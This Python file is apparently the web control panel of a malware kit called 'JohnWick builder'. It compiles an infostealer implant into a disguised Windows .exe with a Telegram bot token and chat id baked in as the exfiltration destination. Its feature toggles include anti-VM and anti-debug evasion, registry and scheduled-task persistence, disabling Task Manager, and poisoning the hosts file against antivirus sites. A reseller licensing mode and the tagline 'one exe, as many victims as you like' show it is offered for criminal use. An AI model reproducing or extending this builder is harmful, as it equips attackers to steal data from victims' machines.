"""Builder panel - browser GUI that drives builder.py end to end.

This is the thing you run first. Open http://127.0.0.1:8787, fill the form, hit
Build, and it bakes cfg.json + runs PyInstaller and hands you dist\\<name>.exe.
Nothing on the command line except starting this file.

What it asks for (all in the form, none as CLI flags):
  bot token . chat id . output exe name . licence key/url (reseller mode) .
  poll interval . toggles for guard / persistence / taskmgr block / hosts blocklist

Two build paths, because they have different requirements:
  * native  - running ON Windows with pyinstaller installed -> real .exe now
  * bundle  - anywhere else -> source zip + a build.bat you run on a Windows box

Security posture, deliberate:
  * binds 127.0.0.1 by default; refuses a routable bind unless JWG_DASHBOARD_TOKEN
    is set, enforced in code. This panel takes a live bot token and writes it into
    an artifact, so it does not sit on a public NIC unauthenticated.
  * the token/chat are POSTed over loopback and written only to cfg.json next to
    the built exe. They never land in this .py or in git.
  * exe names go through a strict allowlist before touching disk.
"""
from __future__ import annotations

import io
import json
import os
import re
import sys
import threading
import zipfile
from functools import wraps

try:
    from flask import Flask, Response, abort, jsonify, request, send_file
except ImportError:
    Flask = None

HERE = os.path.dirname(os.path.abspath(__file__))
SAFE_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")
TOKEN_RE = re.compile(r"^\d{6,}:[A-Za-z0-9_-]{20,}$")

MODULES = [
    "jwg_implant.py", "jwg_cfg.py", "guard.py", "stealer.py", "c2.py",
    "persist.py", "shots.py", "licensing.py", "builder.py", "capture.py",
    "sysinfo.py", "report.py", "probe.py", "config.py",
]

TOGGLES = {
    "guard_enabled": "Anti-VM / anti-debug bail before beaconing",
    "persistence_enabled": "HKCU Run key + scheduled task at logon",
    "block_taskmgr": "Disable Task Manager for the user",
    "av_blocklist": "Poison hosts file for VT / AV update sites",
}

BUILD_STATE = {"running": False, "log": [], "last": None}
_BUILD_LOCK = threading.Lock()


def _log(line: str) -> None:
    BUILD_STATE["log"].append(line)
    del BUILD_STATE["log"][:-400]


# ------------------------------------------------------------------ validation
def validate(form: dict) -> tuple[dict, list[str]]:
    errs: list[str] = []
    token = str(form.get("bot_token", "")).strip()
    chat = str(form.get("chat_id", "")).strip()
    name = str(form.get("name", "SearchHost")).strip() or "SearchHost"

    if not TOKEN_RE.match(token):
        errs.append("bot token must look like '<digits>:<secret>' from @BotFather")
    if not re.fullmatch(r"-?\d{2,}", chat):
        errs.append("chat id must be numeric (get yours from @userinfobot)")
    if not SAFE_NAME.match(name):
        errs.append("exe name: letters/digits/._- only, start alphanumeric, <=64 chars")

    lic_key = str(form.get("licence_key", "")).strip()
    lic_url = str(form.get("licence_url", "")).strip()
    if lic_key and not lic_url:
        errs.append("licence key given but no licence server URL to validate against")

    try:
        poll = float(form.get("poll_interval", 3.0))
        if not (0.5 <= poll <= 60):
            errs.append("poll interval between 0.5 and 60 seconds")
    except ValueError:
        poll = 3.0
        errs.append("poll interval must be a number")

    cfg = {
        "bot_token": token, "chat_id": chat, "name": name,
        "licence_key": lic_key, "licence_url": lic_url, "poll_interval": poll,
        "guard_enabled": bool(form.get("guard_enabled", True)),
        "persistence_enabled": bool(form.get("persistence_enabled", True)),
        "block_taskmgr": bool(form.get("block_taskmgr", True)),
        "av_blocklist": bool(form.get("av_blocklist", True)),
    }
    return cfg, errs


# ------------------------------------------------------------------ build paths
def native_build(cfg: dict) -> dict:
    """Run builder.write_cfg + PyInstaller on this (Windows) host."""
    import builder
    path = builder.write_cfg(
        cfg["bot_token"], cfg["chat_id"],
        licence_key=cfg["licence_key"], licence_url=cfg["licence_url"],
        poll_interval=cfg["poll_interval"], guard_enabled=cfg["guard_enabled"],
        persistence_enabled=cfg["persistence_enabled"],
        block_taskmgr=cfg["block_taskmgr"], av_blocklist=cfg["av_blocklist"])
    _log(f"[cfg] wrote {path}")
    rc = builder.build_exe(name=cfg["name"], upx=True)
    exe = os.path.join(HERE, "dist", f"{cfg['name']}.exe")
    ok = rc == 0 and os.path.isfile(exe)
    _log(f"[build] pyinstaller rc={rc} -> {exe if ok else 'no artifact'}")
    return {"mode": "native", "ok": ok, "artifact": exe if ok else None,
            "cfg": path, "rc": rc}


def bundle_build(cfg: dict) -> dict:
    """Non-Windows host: ship source + baked cfg + a build.bat for a Windows box."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for m in MODULES:
            p = os.path.join(HERE, m)
            if os.path.isfile(p):
                z.write(p, f"{cfg['name']}/{m}")
        z.writestr(f"{cfg['name']}/cfg.json", json.dumps({
            "bot_token": cfg["bot_token"], "chat_id": cfg["chat_id"],
            "licence_key": cfg["licence_key"], "licence_url": cfg["licence_url"],
            "poll_interval": cfg["poll_interval"], "guard_enabled": cfg["guard_enabled"],
            "persistence_enabled": cfg["persistence_enabled"],
            "block_taskmgr": cfg["block_taskmgr"], "av_blocklist": cfg["av_blocklist"],
        }, indent=2))
        z.writestr(f"{cfg['name']}/requirements.txt",
                   "requests\nrequests-toolbelt\npsutil\npycryptodomex\nflask\n"
                   "pywin32; sys_platform == 'win32'\npyinstaller\n")
        bat = (
            "@echo off\r\n"
            f"rem Builds {cfg['name']}.exe on a Windows box with Python 3.10+.\r\n"
            "py -3 -m pip install requests requests-toolbelt psutil pycryptodomex pywin32 pyinstaller || goto :err\r\n"
            "py -3 -m PyInstaller --noconfirm --onefile --noconsole --name " + cfg["name"] + " ^\r\n"
            "  --add-data \"cfg.json;.\" --hidden-import win32crypt --hidden-import winreg ^\r\n"
            "  --collect-submodules Cryptodome jwg_implant.py || goto :err\r\n"
            "echo built: dist\\" + cfg["name"] + ".exe\r\n"
            "goto :eof\r\n:err\r\necho build failed\r\nexit /b 1\r\n"
        )
        z.writestr(f"{cfg['name']}/build-windows.bat", bat)
        z.writestr(f"{cfg['name']}/README.md",
                   f"# {cfg['name']}\n\nRun build-windows.bat on a Windows machine.\n"
                   "cfg.json is already baked with your destination; the bat just compiles.\n"
                   f"Output: dist\\{cfg['name']}.exe\n\n"
                   f"This host ({sys.platform}) cannot produce a Windows binary without "
                   "Wine, hence the bundle.\n")
    out_dir = os.path.join(HERE, "builds")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, f"{cfg['name']}-bundle.zip")
    blob = buf.getvalue()
    with open(path, "wb") as f:
        f.write(blob)
    _log(f"[bundle] wrote {path} ({len(blob)} bytes)")
    return {"mode": "bundle", "ok": True, "artifact": path, "bytes": len(blob)}


def do_build(cfg: dict) -> dict:
    with _BUILD_LOCK:
        BUILD_STATE["running"] = True
        BUILD_STATE["log"] = []
        try:
            if os.name == "nt":
                result = native_build(cfg)
            else:
                _log("[note] non-Windows host -> producing source bundle + build.bat")
                result = bundle_build(cfg)
        except Exception as e:
            result = {"mode": "error", "ok": False, "error": f"{type(e).__name__}: {e}"}
            _log(result["error"])
        BUILD_STATE["last"] = result
        BUILD_STATE["running"] = False
        return result


# ------------------------------------------------------------------ UI
INDEX_HTML = """<!doctype html><meta charset=utf-8>
<title>JohnWick builder</title>
<style>
 body{background:#0f1115;color:#d7dae0;font:14px/1.5 system-ui;margin:0;padding:32px}
 h1{font-size:18px;margin:0 0 4px} .sub{color:#7a828e;margin-bottom:24px}
 form{max-width:640px;display:grid;gap:14px}
 label{display:grid;gap:4px;font-size:12px;color:#9aa3af;text-transform:uppercase;letter-spacing:.04em}
 input[type=text],input[type=password],input[type=number]{background:#171a21;border:1px solid #2a2f3a;
   color:#e8eaed;padding:9px 10px;border-radius:6px;font:inherit}
 .row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
 .toggles{display:grid;gap:8px;border:1px solid #2a2f3a;border-radius:6px;padding:14px}
 .toggles .hd{font-size:12px;color:#9aa3af;text-transform:uppercase;letter-spacing:.04em}
 .toggles div.t{display:flex;gap:8px;align-items:center;font-size:13px;color:#c3c8d0;text-transform:none;letter-spacing:0}
 button{background:#2f6feb;color:#fff;border:0;padding:11px 18px;border-radius:6px;font:inherit;
   font-weight:600;cursor:pointer;width:max-content} button:disabled{opacity:.5;cursor:default}
 pre{background:#171a21;border:1px solid #2a2f3a;border-radius:6px;padding:12px;white-space:pre-wrap;
   max-height:300px;overflow:auto;font-size:12px}
 .hint{color:#6b7280;font-size:11px;text-transform:none;letter-spacing:0}
</style>
<h1>JohnWick builder</h1>
<div class=sub>fill it in, hit build. one exe, as many victims as you like.</div>
<form id=f>
 <label>bot token <span class=hint>@BotFather &rarr; 123456789:AA...</span>
   <input name=bot_token type=password placeholder="9138005461:AAA..." required></label>
 <div class=row>
  <label>chat id <span class=hint>numeric, @userinfobot</span>
    <input name=chat_id type=text placeholder="6698930447" required></label>
  <label>exe name <span class=hint>the output filename</span>
    <input name=name type=text value=SearchHost required></label>
 </div>
 <div class=row>
  <label>poll interval (s)<input name=poll_interval type=number value=3 step=0.5 min=0.5 max=60></label>
  <label>licence key <span class=hint>blank = your own build</span>
    <input name=licence_key type=text placeholder="optional"></label>
 </div>
 <label>licence server url <span class=hint>only with a key - your netlify /api/license endpoint</span>
   <input name=licence_url type=text placeholder="https://you.netlify.app/api/license"></label>
 <div class=toggles><div class=hd>features</div>__TOGGLES__</div>
 <button type=submit>build</button>
</form>
<h3 style="margin-top:28px">output</h3>
<pre id=o>idle</pre>
<script>
const o=document.getElementById('o');
async function poll(){
  const r=await fetch('/api/status').then(x=>x.json());
  o.textContent=(r.log||[]).join('\\n')||'(no output yet)';
  o.scrollTop=o.scrollHeight;
  if(r.running){setTimeout(poll,700);return;}
  if(r.last){
    let s=(r.log||[]).join('\\n')+'\\n\\n'+JSON.stringify(r.last,null,2);
    if(r.last.ok&&r.last.artifact)s+='\\n\\ndownload: '+location.origin+'/api/download';
    o.textContent=s;
    document.querySelector('button').disabled=false;
  }
}
document.getElementById('f').addEventListener('submit',async e=>{
  e.preventDefault();
  const payload=Object.fromEntries(new FormData(e.target).entries());
  ['guard_enabled','persistence_enabled','block_taskmgr','av_blocklist']
    .forEach(k=>payload[k]=!!e.target.elements[k].checked);
  document.querySelector('button').disabled=true;o.textContent='building...';
  const r=await fetch('/api/build',{method:'POST',headers:{'content-type':'application/json'},
    body:JSON.stringify(payload)});
  const d=await r.json();
  if(!d.ok&&d.errors){o.textContent='fix this:\\n'+d.errors.join('\\n');
    document.querySelector('button').disabled=false;return;}
  poll();
});
</script>
"""


def render_index() -> str:
    rows = "".join(
        f'<div class=t><input type=checkbox name={k} checked> {v}</div>'
        for k, v in TOGGLES.items())
    return INDEX_HTML.replace("__TOGGLES__", rows)


def create_app(host: str = "127.0.0.1", port: int = 8787):
    if Flask is None:
        raise RuntimeError("flask not installed: pip install flask")
    token_env = os.environ.get("JWG_DASHBOARD_TOKEN", "").strip()
    loopback = host in ("127.0.0.1", "localhost", "::1")
    if not loopback and not token_env:
        raise RuntimeError(f"refusing to bind {host}: non-loopback requires JWG_DASHBOARD_TOKEN")

    app = Flask(__name__)

    def require_auth(fn):
        @wraps(fn)
        def inner(*a, **kw):
            if not loopback and request.headers.get("Authorization", "") != f"Bearer {token_env}":
                abort(401)
            return fn(*a, **kw)
        return inner

    @app.get("/")
    def index():
        return Response(render_index(), mimetype="text/html")

    @app.post("/api/build")
    @require_auth
    def api_build():
        form = request.get_json(silent=True) or {}
        cfg, errs = validate(form)
        if errs:
            return jsonify({"ok": False, "errors": errs}), 400
        threading.Thread(target=do_build, args=(cfg,), daemon=True).start()
        return jsonify({"ok": True, "started": True})

    @app.get("/api/status")
    @require_auth
    def api_status():
        return jsonify({"running": BUILD_STATE["running"],
                        "log": BUILD_STATE["log"][-120:],
                        "last": BUILD_STATE["last"]})

    @app.get("/api/download")
    @require_auth
    def api_download():
        p = (BUILD_STATE["last"] or {}).get("artifact")
        if not p or not os.path.isfile(p):
            abort(404, description="nothing built yet")
        return send_file(p, as_attachment=True, download_name=os.path.basename(p))

    return app


if __name__ == "__main__":
    host = os.environ.get("JWG_PANEL_HOST", "127.0.0.1")
    port = int(os.environ.get("JWG_PANEL_PORT", "8787"))
    app = create_app(host, port)
    print(f"[panel] open http://{host}:{port}  -> fill the form -> Build")
    app.run(host=host, port=port, threaded=True)
